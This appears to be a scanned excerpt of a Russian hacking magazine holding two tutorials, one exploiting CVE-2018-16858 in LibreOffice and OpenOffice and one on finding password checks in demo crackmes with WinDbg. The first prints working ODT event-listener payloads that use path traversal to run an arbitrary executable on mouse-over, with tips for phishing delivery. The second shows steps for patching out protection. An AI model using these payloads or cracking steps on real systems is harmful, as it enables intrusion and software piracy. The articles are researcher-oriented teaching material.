на внешний носитель. Если сам позабо тишься о сохранности информации, то
шифровальщики будут не страшны.
ВЗЛОМ





                                                         8bit
                                                    vegelin47@mail.ru


ODT   ПОД ПРИЦЕЛОМ

 КАК ЗАСТАВИТЬ ДОКУМЕНТЫ OPENOFFICE
   ЗАПУСКАТЬ ПРОИЗВОЛЬНЫЕ ФАЙЛЫ





Фишинговые кампании —  классическое  начало многих
хакерских атак. Они направле ны на доставку вредоносного
файла потенциальной жертве и обычно ведутся по электрон‐
ной почте. Чаще всего оболочкой для боевой нагрузки слу‐
жит офис ный документ, при открытии которого выполняются
нестандартные действия. Мы рассмотрим, как выполнить
произвольный код с помощью модифицированного файла
OpenDocument Text.


Большинство фишинговых приемов направлены на экс плуатацию уяз вимос‐
тей в Microsoft Oﬃce, так как это самый популярный офис ный пакет. Однако
сейчас многие фир мы переходят на LibreOﬃce и OpenOﬃce, в том числе
ошибочно считая их неуяз вимыми.
  С ростом популярности этих программных пакетов они тоже стали прив‐
лекать внимание хакеров и независимых исследова телей. Просто, в отличие
от набивших оскомину багов MS Oﬃce, информа ции об уязвимостях в опен‐
сорсных пакетах пока накопилось не так уж много. Целью моего исследова‐
ния будет не столько рассмотреть уяз вимость какой‐то конкретной версии
программы, сколько разоб рать формат ODT и осо бенности его обработки.


           WARNING

                        Статья предназначена для «белых хакеров», про‐
                    фессиональных  пен тесте ров  и  руководите лей
                       службы информацион ной безопасности (CISO).
                    Ни автор, ни редакция не несут ответственности
                        за любой возможный вред, причиненный матери‐
                       алами дан ной статьи.



ЭКСПЛУАТИРУЕМ CVE-2018-16858
Те ория
Найденная уязвимость позволяет выпол нить несанкционированный доступ
к файловой системе, используя атаку обхода пути (path traversal attack).
Это одна из самых часто встречающихся уяз вимостей и канонический тип
атаки. В данном случае зло намеренно модифицированный файл ODT может
загрузить за пределами родительского каталога скрипт на Python, который
получит дос туп к файловой системе и выполнит любые указанные действия
с правами текущего пользователя.
  Первым данную уязвимость обна ружил старший пентестер немецкой фир‐
мы Cure53 Алекс Инфур (Alex Infuhr). Он предал свою находку огласке, и Libre‐
Oﬃce пропатчили, однако все версии до 6.0.7 (крайне популярные сейчас)
по‐прежнему уязвимы.
  Немного размытой оста ется ситуация с Apache OpenOﬃce. Отдельного
патча нет, и текущая версия 4.1.6 уязвима до сих пор. Сторонняя компания
ACROS Security вклю чила в свой агент 0patch заплатку для данной уязвимос‐
ти, но только в вер сиях OpenOﬃce и LibreOﬃce для Windows. Более под робно
см. на их сайте.
  Данный агент распознает и блокиру ет известные уяз вимос ти, пре пятствуя
их эксплуатации. Для его запус ка надо будет пройти несложную регистрацию.
Во время работы агента при запус ке уяз вимого файла всплывает небольшое
уведомление, а при наведении курсора на гиперссылку он заблокирует
запуск неоригинального скрипта. Я свя зался с разработчиками агента, пыта‐
ясь пролить свет на работу данной функции. Их ответ приведен на скриншоте.





                   От вет разработчиков агента



     Наш мик ропатч для LibreOffice и OpenOffice прос то проверяет, что
       [в документе] нет типич ных шаблонов для выполнения ата ки «обход
       пути», таких как "../", "..\" или "..|".

Интересно,  что некото рые антивиру сы  также ищут приз наки эксплоита
по всему документу, включая его текстовые поля и игнорируя формат. Нап‐
ример, «Антивирус Касперского» ругается даже на эту статью, если попытать‐
ся открыть ее черновик в OpenOﬃce как .odt или в MS Oﬃce как .docx.





                  Ложнополо жительный детект


Прак тика
Разберем суть уязвимости. Во время инстал ляции LibreOﬃce в Windows также
устанавливается интерпретатор Python 3. Он находится по извес тному адресу
C:\Program Files\LibreOffice\program\python‐core‐3.5.5\bin. Офис‐
ный пакет может исполнить Python‐скрипт, если ука зать ссылку на него внутри
документа и правильно сослаться на него.
  Документы .odt основаны на XML (как и .docx), поэтому их внутреннюю
структуру легко изучать и модифицировать. Здесь открывается большой
простор для разных вариантов атак, но в общем случае нам необходимо соз‐
дать в документе какую‐либо задачу, которая запустит скрипт на Python.
   Вот тут и наступает самое интересное. Если подменить путь к исполняемо‐
му коду и он будет соответс твовать правилам исполнения, то LibreOﬃce
выпол нит его, не проверяя путь к скрипту. Например, мы можем выйти
за рамки рабочей директории, и ничего нам за это не будет... а вот жертве —
будет!
  Все описанное выше справедливо и для OpenOﬃce, прос то в нем исполь‐
зуется Python 2, поэто му мес тополо жение некоторых скриптов будет другое.
Это нужно учесть, если ты захочешь написать универсальный файл, эксплу‐
атирующий уязвимость в обо их офисных пакетах.


             INFO

                     Все  тесты  проведены  на  Windows  10  вер‐
                       сия 1803 сборка 17134.523. За основу взят пакет
                         LibreOfﬁce последней уязвимой версии 6.0.6.2.



Соз даем вре доносный файл
Открываем LibreOﬃce и создаем документ .odt с помощью Writer. Теперь нам
необходимо добавить вызов любого Python‐скрипта. На помощь приходит
событие OnMouseOver, которое воз никает при простом наведении курсора
мыши на гиперссылку в документе. Преимущес тво состоит в том, что жертве
даже кликать никуда не придется: навес ти курсор на ссылку в документе мож‐
но и случайно, осо бенно если она занимает весь лист и такого же белого
цвета.
  Идем в меню «Вставка → Гиперссылка». Заполняем поле URL любой
ссылкой (неважно какой). В дополнитель ных настройках, напротив «Фрейм:»,
в конце окна есть кнопка «События», которая вызывает настрой ки макроса.
В поле «Назначения» выбираем «Мышь над объектом» (то, о чем и было ска‐
зано). И в поле «Существу ющие макросы» добавим createTable (находится
в ветке «Макросы LibreOﬃce → pythonSample»). Назначаем нужное нам
событие.





                 Создание события OnMouseOver

Теперь заполняем поле «Текст» и кликаем «Применить». На листе появляется
гиперссылка, при наведении на которую исполня ется макрос. В моем при‐
мере так открывается еще один документ с информацией о первом в виде
таблицы и парой примеров из руководства.





  Документ, сфор мированный макросом при наведении курсора на гипер‐
  ссылку

Сохраняем документ и закрываем. Упрощенно ODT — это XML в ZIP, поэтому
посетить «недра» нашего файла можно с помощью любого архиватора с под‐
держкой ZIP. Я исполь зую WinRAR. Откры ваем ODT как архив и смотрим
структуру.
  В корневом каталоге нас интересует файл content. Разархивируем его
и откроем в любом текстовом редакторе (я исполь зую Notepad++). В конце
разметки (на скрин шоте выделил это в отдельную строку) видно, что явно ука‐
зывается скрипт, который будет исполнять ся. Имя ему TableSample.py.





                  Содержимое файла content

Располагается данный файл (как и все примеры скриптов) по пути C:\Pro‐
gram   Files\LibreOffice\share\Scripts\python\pythonSamples.  Если
открыть его и посмотреть на исходный код, то можно заметить, что название
одной из двух функций (а именно createTable()) совпадает со словами
в теле content после наз вания выполняемого скрипта. Это значит, что в фай‐
ле разметки указано не только название файла со скриптом, но и функция,
которую необходимо выполнить!





               Содержимое файла TableSample.py

Проведем экспе римент: заменим в TableSample.py функцию createTable()
на insertTextIntoCell() , не вписывая ее параметры. При откры тии файла
получим ошибку с названием новой функции.





               Ошибка после изменения функции

Отлично! Сообщения об ошибках — это та обратная связь, которая поможет
сделать правильный вызов «боевой наг рузки». Добавим параметры для in‐
sertTextIntoCell() и запус тим снова. Теперь воз никает другая ошибка.
Она показывает, что параметры неверны, а зна чит, принимались на исполне‐
ние и проверялись. Довольно приятные новос ти!





          Ошибка после добавления параметров функции

Идем дальше. Восстановим документ в первоначальное сос тояние и поп‐
робуем изменить путь к скрипту (для этого я просто скопировал скрипт
на уровень выше, а в файле content перед именем скрипта добавил ../).
В этот раз файл отработал как надо, без единой ошиб ки.
  Подведем промежуточный итог: мы можем явно указать в документе ODT
загрузку любого скрипта на питоне по извес тно му адресу и вызывать его фун‐
кцию по стандартному событию (например, OnMouseOver). В использовав‐
шемся для примера TableSample.py никаких потенциально опасных функций
нет, а вот в каком‐то дру гом скрипте из стандартной подборки они могут
быть.
   Алекс Инфур нашел такой — pydoc.py, который находится в C:\Program
Files\LibreOffice\program\python‐core‐3.5.5\lib. В нем есть функция
tempfilepager(). С ее помощью через вызов os.system()можно запустить
любой исполняемый файл, причем с произволь ными аргументами — дос‐
таточно передать их в строчку


os.system(cmd + ' "' + filename + '"')





             Код функции tempﬁlepager() в файле pydoc.py

Чтобы все зарабо тало, нам необходимо лишь прописать путь до скрипта
и вызывать опасную функцию с нужными параметрами.





                 От редактированный файл content


ЗАПУСКАЕМ ЭКСПЛОИТ
Настал момент X! Мы открываем модифи цированный документ ODT, курсор
оказывается наведенным на скрытую ссылку, и про исходит магия — без раз‐
решения пользователя запус кается произволь ный файл (злобный пей лоад
или простой калькулятор в качес тве PoC).
  Для OpenOﬃce строка будет выглядеть так:


<office:event‐listeners><script:event‐listener script:language="ooo:
script" script:event‐name="dom:mouseover" xlink:href="vnd.sun.star.
script:../../../program/python‐core‐2.7.6/lib/pydoc.py$tempfilepager(
1, calc.exe )?language=Python&location=share" xlink:type="simple"/>

В LibreOﬃce она же записывается так:


<office:event‐listeners><script:event‐listener script:language="ooo:
script" script:event‐name="dom:mouseover" xlink:href="vnd.sun.star.
script:../../../program/python‐core‐3.5.5/lib/pydoc.py$tempfilepager(
1, calc.exe )?language=Python&location=share" xlink:type="simple"/>

Вот и вся разница.


НЕУЯЗВИМЫЕ ВЕРСИИ
После проделанных опытов я начал изучать заплатку этой уяз вимос ти. В Libre‐
Oﬃce версии 6.0.7 я заметил ошиб ку, которая стала возникать при запус ке
скрипта, до этого работавшего в LibreOﬃce 6.0.6.2. Она ссы лается на стро‐
ку 998 файла pythonscript.py, рас положенного  в папке C:\Program
Files\LibreOffice\program.





                  Исходный код pythonscript.py

Как видно на скриншоте, функция getScript() просит параметр scriptUri.
Как раз в этом параметре и воз никает ошиб ка в строке


mod = self.provCtx.getModuleByUrl(fileUri)

Та же самая ошибка возникает в OpenOﬃce, если эксплуатационный файл
сконфигурирован неправильно (неверно ука зан путь к скрипту). Эта ошибка
возникала и когда я пытался вызвать скрипт на уда ленной машине по SMB‐
протоколу в формате \\\server\pydoc.py.
   Изучив код pythonscript.py, я  увидел,  что функция scriptURI2S‐
torageUri() (214‐я строка файла) претерпела кардинальные изменения.
Теперь она проверяет, находится ли скрипт в рабочей директории или нет.
Выглядит этот фрагмент так:


# base path to the python script location
sBaseUri = self.m_baseUri + "/"
xBaseUri = self.m_uriRefFac.parse(sBaseUri)


# path to the .py file + "$functionname, arguments, etc
xStorageUri = self.m_uriRefFac.parse(scriptURI)
sStorageUri = xStorageUri.getName().replace( "|", "/" );


# path to the .py file, relative to the base
sFileUri = sStorageUri[0:sStorageUri.find("$")]
xFileUri = self.m_uriRefFac.parse(sFileUri)
if not xFileUri:
message = "pythonscript: invalid relative uri '" + sFileUri+ "'"
log.debug( message )
raise RuntimeException( message )


# absolute path to the .py file
xAbsScriptUri = self.m_uriRefFac.makeAbsolute(xBaseUri, xFileUri,
True, RETAIN)
sAbsScriptUri = xAbsScriptUri.getUriReference()
# ensure py file is under the base path
if not sAbsScriptUri.startswith(sBaseUri):
message = "pythonscript: storage uri '" + sAbsScriptUri + "' not in
base uri '" + self.m_baseUri + "'"
log.debug( message )
raise RuntimeException( message )
ret = sBaseUri + sStorageUri

Более подробное сравнение приводится на скриншоте.





                  Добавленная проверка пути

Сама функция tempfilepager() никак не изменилась вплоть до LibreOﬃce
v.6.2.1 (на момент написа ния статьи — пос ледняя из стабильных). Строчку
обращения к операционной системе по заданным параметрам все так же
можно использовать. Если удастся обойти запрет на указание мес тополо‐
жения файла, то можно будет эксплуати ровать очеред ную уязвимость, изме‐
нив лишь название папки на python‐core‐3.5.6.


ЗАКЛЮЧЕНИЕ
Мы разобрали уязвимость CVE‐2018‐16858, экс плуатация которой счи тается
очень легкой. Проб лема в том, что дырявые версии LibreOﬃce продолжают
широко использоваться, а OpenOﬃce не пропатчен до сих пор. Поэтому
не откладывай обновле ние LibreOﬃce и оза боть ся допол нительным уровнем
защиты для OpenOﬃce.


        WWW

                    •Исследование уязвимости CVE‐2018‐16858
                    •PoC для CVE‐2018‐16858
                   •Об атаке «обход пути»
ВЗЛОМ

ФУНДАМЕНТАЛЬНЫЕ
ОСНОВЫ
ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex‐
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.

НОВЫЕ СПОСОБЫ
НАХОДИТЬ ЗАЩИТНЫЕ
МЕХАНИЗМЫ В ЧУЖИХ
                                                            Юрий Язев
                                                                      Широко известен подПРОГРАММАХ                                                                          псевдонимом yurembo.
                                                                            Программист, разработчик
                                                                                  видеоигр, независимый
                                                                                исследователь. Старый автор
                                                                                журнала «Хакер».
                                                                                    yazevsoft@gmail.com





Чтобы иметь возможность ломать программы, на страже
которых стоят хитрые защитные механизмы, необходимо
знать разные способы нахождения этих самых механизмов
в подопытном приложении. В сегодняшней статье будет
показано, как это сделать, а в конце мы раз берем при мер
работы с графическим приложением.


             INFO

                       Пятнадцать лет назад эпический труд Криса Кас‐
                      перски  «Фундамен тальные  осно вы  хакерства»
                     был настольной книгой каждого начинающего
                       исследователя в области компьютерной безопас‐
                         ности.  Пуб ликуемый  «Хакером»  одноименный
                       цикл статей — попытка обновить эту книгу с уче‐
                      том  современных  реалий.  Начать  чтение  ты
                    можешь  со  статьи  «Проверка  аутентичности
                      и базовый взлом защиты».


В прошлой статье мы узнали, каким образом соот нести адреса байтов в вир‐
туальной памяти с их реальным рас положением на носите ле. Это потребова‐
ло от нас напрячь мозг и применить математику. Между тем, как мы увидели
из предыдущих статей, непос редственный взлом, когда известно месторас‐
положение защитного механизма, представляет собой элементарную задачу,
которую легко решить с помощью HIEW или другого редактора PE‐файлов.


СПОСОБ 1. ПРЯМОЙ ПОИСК ВВЕДЕННОГО ПАРОЛЯ В ПАМЯТИ
Пароль, хранящийся в теле программы откры тым текстом, — скорее из ряда
вон выходящее исключение, чем правило. К чему услуги хакера, если пароль
и без того виден невоору женным взглядом? Поэтому разработчики защиты
всячески пытаются скрыть его от посторонних глаз (о том, как именно они
это делают, мы поговорим поз же).
  Впрочем, учитывая размер современных пакетов, программист может
без особого труда поместить пароль в каком‐нибудь завалявшемся файле,
попутно снабдив его «крякушами» — строками, выглядящими как пароль,
но паролем не являющимися. Попробуй разберись, где тут липа, а где нет,
тем более что подходящих на эту роль строк в проекте средней величины
может быть несколько сотен, а то и тысяч!
  Давай подойдем к решению проб лемы от обратного — будем искать
не оригинальный пароль, который нам неизвестен, а ту строку, которую мы
скормили программе в качестве пароля. А найдя, установим на нее бряк,
и дальше все точно так же, как и раньше. Бряк всплывает на обращение
по сравнению, мы выходим из сравнивающей про цеду ры, корректируем JMP
и...
   Взглянем еще раз на исходный текст лома емого нами примера passCom‐
pare1.cpp:


for(;;)
{
    printf("Enter password:");
    fgets(&buff[0],PASSWORD_SIZE,stdin);
    if (strcmp(&buff[0],PASSWORD))
        printf("Wrong password\n");
    else break;
    if (++count>2) return ‐1;
}

Обрати внимание — в buff чита ется введенный поль зовате лем пароль, срав‐
нивается с оригиналом, затем (при неудачном сравнении) запрашивается
еще раз, но (!) при этом buff не очищается! Отсю да сле дует, что, если после
выдачи ругательства Wrong password вызвать отладчик и пройтись по памяти
контекстным поиском, можно обнаружить тот заветный buff, а остальное уже
дело техники!
   Итак, приступим (мы еще не знаем, во что мы ввязываемся, — но, увы,
в жизни все сложнее, чем в теории). На этот раз запус тим passCompare1.exe
отдельно от отладчика. Затем подключимся к процес су из отладчика (Attach
to process в WinDbg). Обрати внимание: в окне выбора процесса отобража‐
ются все запущенные процес сы и для каждого из них выводится его раз‐
рядность в столбце Platform. Вво дим любой пришедший на ум пароль (нап‐
ример, KPNC  Kaspersky++), пропус каем возмущенный вопль Wrong мимо
ушей и в отладчике нажимаем Break (сочета ние кла виш Alt + Del).





              Окно со списком процессов для выбора

Попробуем отыскать в памяти введенный пароль:



  0:001> s ‐a 0x0 L?0x7FFFFFFF "KPNC Kaspersky"



Пояс нения
Первый параметр после команды s — флаг ‐a — определяет цель поиска
как набор ASCII‐символов. Второй параметр — смещение, отку да начать
искать. Вообще‐то начинать поиск с нулево го смещения — идея глу пая. Судя
по карте памяти, здесь рас положен служебный код и искомого пароля быть
не может. Впрочем, это ничему не вредит, и так гораздо быстрее, чем раз‐
бираться, с какого адреса загружена программа и откуда именно начинать
поиск.
   Третий параметр — верхний предел поиска, то есть «докуда». Здесь у нас
стоит максимальное 32‐бит ное зна ковое число, таким образом мы охватыва‐
ем весь возможный диапазон 32‐битного про цес са.
  Последний параметр — собственно искомая строка. Обрати вни мание,
что мы ищем не всю строку, а только ее часть (KPNC Kaspersky++ против
KPNC Kaspersky). Это позволя ет избавить ся от ложных срабаты ваний, воз‐
никающих из‐за ссылок на внутренние буфера.


Результат (у тебя значения, скорее всего, получатся другими, и они будут
меняться при каждом переза пус ке приложения):



  00f9f810 4b 50 4e 43 20 4b 61 73‐70 65 72 73 6b 79 2b 2b  KPNC Kasper‐
  sky++
  0147fd80 4b 50 4e 43 20 4b 61 73‐70 65 72 73 6b 79 2b 2b  KPNC
  Kaspersky++


Целых два вхождения! Почему два? Предположим, что при чтении ввода
с клавиатуры символы сперва попада ют в системный буфер, который и дает
ложное срабатывание. Тем не менее не ставить же, не разобравшись, сразу
обе точки останова. В данном случае четырех отла дочных регистров процес‐
сора хватит, а как быть, если бы мы нашли десяток вхождений? Да и в двух
бряках немудрено заблудиться с непривычки! Как отфильтровать помехи?
  Начинаем думать.
  На помощь приходит карта памяти — зная владельца региона, которому
принадлежит буфер, мож но очень многое сказать об этом буфере. Нас коро
набив уже знакомую команду !dh passCompare1, мы получим приблизитель‐
но следующее (выбраны сведения только о секциях .data и .rdata ):



  SECTION HEADER #2
  .rdata name
      A7E virtual size
      2000 virtual address
      C00 size of raw data
      1200 file pointer to raw data
      0 file pointer to relocation table
      0 file pointer to line numbers
      0 number of relocations
      0 number of line numbers
  40000040 flags
          Initialized Data
          (no align specified)
          Read Only


  SECTION HEADER #3
  .data name
      388 virtual size
      3000 virtual address
      200 size of raw data
      1E00 file pointer to raw data
      0 file pointer to relocation table
      0 file pointer to line numbers
      0 number of relocations
      0 number of line numbers
  C0000040 flags
          Initialized Data
          (no align specified)
          Read Write


Заодно определим базовый адрес модуля приложения: lmf m passCompare1
(в моем конкретном слу чае он равен 0xDE0000, а у тебя значение, ско рее
всего, будет другим). Узна ем, куда в памяти заг ружена секция .rdata :
0xDE0000 + 0x2000 == 0xDE2000, а также куда загружена секция .data :
0xDE0000 + 0x3000 == 0xDE3000. Это гораздо выше найденных адресов
расположения буферов с введенным паролем. Следовательно, найденные
адреса не указывают в области .data и .rdata .
  Думаем дальше. Адрес 0x147fd80 выходит далеко за пределы ломаемого
приложения, и вообще непонят но, чему принадлежит. Почесав затылок, мы
вспомним о такой «вкусности» Windows, как куча (heap). С помощью команды
!heap посмотрим, где она начина ется:



  Index   Address  Name      Debugging options enabled
  1:   01470000


Из этого заключаем, что адрес 0x147fd80 явно находится в куче.
   Разбираемся дальше. Пос кольку стек растет снизу вверх (то есть от стар‐
ших адресов к младшим), адрес 0xf9f810 находится в стеке. Уверенность
подогревает тот факт, что большинс тво программис тов раз мещает буфера
в локальных переменных, ну а локальные переменные, в свою оче редь, раз‐
мещаются компилятором в стеке.
   Ну что, попробуем пос тавить бряк по первому адресу?



  0:001> ba r4 00f9f810
  0:001> g


На втором запросе пароля снова вво дим KPNC Kaspersky++. Жмем Enter
и дожидаемся сиюминутной активации отладчика. Бряк произошел на второй
из этих строк:


77c349f3 8806           mov     byte ptr [esi], al
77c349f5 46             inc     esi
77c349f6 8975d8         mov     dword ptr [ebp‐28h], esi

Смотрим, что находится в регистре esi:



  dc esi
  00f9f810 434e504b 73614b20 73726570 2b2b796b  KPNC Kaspersky++


Впрочем, этого и следовало ожидать. Попробуем выйти из текущей функции
по Shift + F11. И мы снова попадем на эту же строку. Вновь посмотрим содер‐
жимое этого регистра:



  00f9f811 20434e50 7073614b 6b737265 0a2b2b79  PNC Kaspersky++.


Ага, один символ откусан. Следовательно, мы находимся в сравнивающей
процедуре. Выйдем из нее нажатием на F5, так как при нажатии на Shift +
F11 мы перейдем в следующую итерацию перебора символов.



  00de10e0 b80821de00   mov     eax, offset passCompare1!`string'
  (00de2108)
  00de10e5 8a11         mov     dl, byte ptr [ecx]
  00de10e7 3a10         cmp     dl, byte ptr [eax]
  ds:002b:00de2108=6d
  00de10e9 751a         jne     passCompare1!main+0xc5 (00de1105)


И вот мы в теле уже хорошо нам зна комой (раз вивай зри тельную память!)
процедуры срав нения оригинального и введенного пользователем паролей.
На всякий случай для пущей убежденнос ти выведем значение указателей EAX
и ECX, чтобы узнать, что с чем сравнивается:



  0:000> dc eax
  00de2108 4f47796d 6170444f 6f777373 000a6472  myGOODpassword..
  0:000> dc ecx
  00f9f810 434e504b 73614b20 73726570 2b2b796b  KPNC Kaspersky++


Как раз то, что мы ищем!
   Ну а остальное мы уже про ходили. Записываем адрес условного перехода
(ключевую последователь ность для поиска), с помощью сведений из прош‐
лой статьи находим адрес инс трукции на носителе, соответствующей спро‐
ецированной в памяти, пра вим исполняемый файл, и все окей.


Вы воды
Итак, мы познакомились с одним более или менее универсальным способом
взлома защит, основанных на сравнении пароля (поз же мы уви дим, что он
подходит и для защит, основанных на регис тра ционных номерах). Его
основное достоинство — простота. А недос татки... недостатков у него много:
 • если программист очистит буфера после сравнения, поиск введенного
   пароля ничего не даст, разве что оста нутся системные буфера, которые
   так просто не затрешь, но отследить перемещения пароля из системных
   буферов в локальные не так‐то легко;
 • служебных буферов мно го, и очень трудно определить, какой из них «нас‐
   тоящий». Программист же может располагать буфер и в сегменте данных
   (статический буфер), и в стеке (локальный буфер), и в куче, и даже
   выделять  память  низкоуровневыми  вызовами  типа  VirtualAlloc  или...
   да мало ли как разыграет ся его фантазия. В резуль тате подчас приходится
   просеивать все найденные вхождения тупым перебором.


СПОСОБ 2. БРЯК НА ФУНКЦИИ ВВОДА ПАРОЛЯ
Взлом приложе ния с GUI
Настала  пора  разнооб разить наш объект  взлома.  Теперь  попробуем
заломить приложение с гра фическим интерфейсом. В качестве тренировки
разберем passCompare3. Это то же самое, что и passCompare1.exe, только
с графическим интерфейсом на основе MFC Dialog Based App (см. в скачива‐
емых материалах к статье).





                Старый доб рый MFC Application Wizard

Также обрати внимание на то, что работа с текстом в этом примере орга‐
низована по‐другому. Если рань ше мы работа ли с базовым типом char, то
здесь используется обертка — класс CString, что, скорее все го, при взломе
профессиональных приложений будет встречаться нам чаще. Кроме двух кно‐
пок, идущих в заготов ке по умолчанию, добавь на форму элемент Edit Control.
Свяжи его с переменной m_password и соз дай событие обработки нажатия
на кнопке OK. Это и будет ключевая процеду ра при ложе ния, проверяющая
введенный пароль на равенство эталонному:


const CString PASSWORD = _T("myGOODpassword");
…
void CpassCompare3Dlg::OnBnClickedOk()
{
    CString str = NULL;


    m_password.GetWindowText(str);
    if (PASSWORD.Compare(str))
    {
        MessageBox(_T("Wrong password"));
        m_password.SetSel(0, ‐1, 0);
        return;
    }
    else
    {
        MessageBox(_T("Password OK"));
    }
    CDialogEx::OnOK();
}

Кажется, никаких сюрпризов не предвидится.
  При всем желании метод пря мого поиска пароля в памяти элегантным
назвать нельзя, да и практичным тоже. А собс твенно, зачем искать сам
пароль, спотыкаясь о бес порядочно разбросанные буфера, когда можно пос‐
тавить бряк непосредственно на функцию, его считывающую? Хм, можно
и так... да вот угадать, какой имен но функцией раз работчик вздумал читать
пароль, вряд ли будет намного проще.
  На самом деле одно и то же действие может быть выпол нено всего лишь
несколькими функциями и их перебор не займет много вре мени. В частности,
содержимое окна редактирова ния обычно добыва ется при помощи либо
функции GetWindowTextW (чаще всего), либо функции GetDlgItemTextW (а
это значительно реже). Все версии Windows NT и младше предпочитают
работать с юникодом, поэто му на конце функций работы с текстом W (wide),
а не A (ASCII).
   Раз уж речь зашла об окнах, запустим наш GUI «крякмис» и установим точ‐
ку останова на функцию GetWindowTextW (bp User32!GetWindowTextW). Хотя
эта функция — системная, точка останова не будет глобальной и не затронет
все приложения в системе, а будет функци они ровать только в контексте дан‐
ного приложения.
  Вводим какой‐нибудь пароль  (KPNC  Kaspersky++, по обыкновению),
нажимаем клавишу Enter, и отладчик незамедлительно всплывает:



  USER32!GetWindowTextW:
  7510a8e0 6a10           push    10h
  7510a8e2 68e0041875     push    offset
  USER32!__HrLoadAllImportsForDll+0x1e9 (751804e0)
  7510a8e7 e88c510200     call    USER32!_SEH_prolog4 (7512fa78)
  7510a8ec 8b750c         mov     esi, dword ptr [ebp+0Ch]
  7510a8ef 85f6           test    esi, esi


Может случиться так, что сначала произойдет «левая» активация отладчи ка.
Ее можно пропустить многократным нажатием F5 до тех пор, пока отладчик
вновь не всплывет на этой же функции. А лучше, чтобы не пропустить нужный
момент, как только мы попадем в GetWindowTextW, выйти из нее по нажатию
Shift + F11 и посмотреть, куда попада ем. Если вокруг находятся вызовы
перерисовки элементов, то, значит, это процеду ра перери совки формы и нам
не сюда.
  Перерисовка элементов:



  6b08a247 0f84804f0200   je      COMCTL32!Button_DrawThemed+0x2519b
  (6b0af1cd)
  6b08a24d 57             push    edi
  6b08a24e 50             push    eax
  6b08a24f ff33           push    dword ptr [ebx]
  6b08a251 ff15c0f51d6b   call    dword ptr [COMCTL32!imp_GetWindowTextW
  (6b1df5c0)]
  6b08a257 8bcb           mov     ecx, ebx
  6b08a259 e80b010000     call    COMCTL32!Button_GetTextFlags (6b08a369)


Если же после выхода из USER32!GetWindowTextW мы попадаем в passCom‐
pare3!CWnd::GetWindowTextW, делаем еще один выход. Следуя логике, мы
в результате попадаем в обработчик нажатия кнопки OK на форме или Enter
на клавиатуре, прямо на первую строчку приведенного ниже листинга:



  00ef2809 e8c6750100     call    passCompare3!CWnd::GetWindowTextW
  (00f09dd4)
  00ef280e 8b45ec         mov     eax, dword ptr [ebp‐14h]
  00ef2811 85c0           test    eax, eax
  ...
  00ef284b 1bc0           sbb     eax, eax
  00ef284d 83c801         or      eax, 1
  00ef2850 8bce           mov     ecx, esi


Жмем F10, чтобы сделать шаг вперед в трассировке программы. Теперь
можем узнать значение в регистре eax:



  0:000> dc eax
  014a6cb8 0050004b 0043004e 004b0020 00730061  K.P.N.C. .K.a.s.
  014a6cc8 00650070 00730072 0079006b 002b002b  p.e.r.s.k.y.+.+.


Хорошо, введенный пароль, есть контакт. Только почему после каждого сим‐
вола стоит точка? Думаю, ты уже догадал ся, что она означает двухбайтовую
природу символа перед ней. Отхлебнув пивка, кваса или лимонада (по
желанию), вспоминаем, что, хоть класс CString и может работать с типами
char (однобайтовое представление символов) и wchar_t (многобайтовое
представ ление до четырех байт, то есть юни код в UTF‐8, ‐16 или ‐32),
это зависит от настроек компилятора. А именно от того, какой символ вклю‐
чен: MBCS — char, UNICODE — wchar_t. Чаще всего используется второй набор
символов, так как по умолчанию включены именно широкие символы.
  Судя по всему, где‐то рядом притаил ся эталонный пароль. Сде лаем пару
шагов внутри про цедуры. Мы попада ем на строку 00ef2850 8bce mov ecx,
esi, которая находится в конце приведенного выше листинга.
  Проверим содержимое регистра ecx:



  0:000> dc ecx
  01437518 0079006d 004f0047 0044004f 00610070  m.y.G.O.O.D.p.a.
  01437528 00730073 006f0077 00640072 abab0000  s.s.w.o.r.d.....


И правда! Интуиция нас не подвела, эталонный пароль тут как тут.





                       Работа при ложения


Из меняем тип дан ных
А что, если бы программист для сохранения введенного пароля восполь‐
зовал ся не классом CString, а по ста ринке — мас сивом широких символов
wchar_t? Давай посмотрим семпл passCompare35. Он отличается от пре‐
дыдущего только изменением типа данных считыва емой строки и исполь‐
зованием перегруженного метода для ее считыва ния:


wchar_t str[MAX_PASSWORD_SIZE];
…
m_password.GetWindowText(str, MAX_PASSWORD_SIZE);

Как видишь, у этого метода появился параметр размерности строки, он же
величина строкового буфера, добавь его объявление в начало программы:
const int MAX_PASSWORD_SIZE = 0x666;.
   Натравим отладчик на исполняемый файл. Пос тавим бряк на функцию
GetWindowTextW, как в прошлом примере. Теперь, если прос ледить выпол‐
нение программы после всплытия отладчика, мы не обнаружим эталонный
пароль на прежнем мес те.
   Что же делать? Как теперь его искать? Мы пойдем другим путем, но в том
же направлении. Когда мы окажемся в passCompare3!CWnd::GetWindowTex‐
tW после вызова User32!GetWindowText, у нас уже будет считанный из эле‐
мента управления буфер, содержащий строку. Если на этот буфер пос тавить
бряк, то мы доберемся до места, где пароли сравнива ются.
   Вот там мы поймаем эталонный пароль. Но как узнать адрес буфера? Есть
по меньшей мере два пути. Первый — вос пользоваться командой kp, она
выведет стек вызовов всех функций с их параметрами. На вершине будет
последняя вызванная функция, в которой мы сейчас находимся, с парамет‐
рами:



  0:000> kp
  # ChildEBP RetAddr
  00 004fe4b8 00e127c0 passCompare35!CWnd::GetWindowTextW(wchar_t * lp‐
  szString = 0x004fe4d0 "KPNC Kaspersky++", int nMaxCount = 0n1638)+0x24 [
  f:\dd\vctools\vc7libs\ship\atlmfc\src\mfc\winocc.cpp @ 255]
  ...





                      WinDbg с окном Locals

Второй способ — восполь зоваться сведениями из окна Locals (полезная шту‐
ка): View → Locals. Если бы программист оста вил пароль в локальных
переменных какой‐либо функции, мы бы просто уви дели его в окне Locals.
Удобно, безусловно. Итак, адрес буфера с паролем узнали (в твоем слу чае он
будет другим), осталось легким движением руки поставить бряк:



  ba r4 0x004fe4d0


Продолжим выполнение. Отладчик тут же вспы хивает снова в функции pass‐
Compare35!CpassCompare35Dlg::OnBnClickedOk, прямо на последней стро‐
ке:



  passCompare35!CpassCompare35Dlg::OnBnClickedOk:
  ...
  00e127bb e805c50100   call    passCompare35!CWnd::GetWindowTextW
  (00e2ecc5)
  00e127c0 a1c4fefd00   mov     eax, dword ptr [passCompare35!PASSWORD
  (00fdfec4)]
  00e127c5 8d8d30f3ffff lea     ecx, [ebp‐0CD0h]
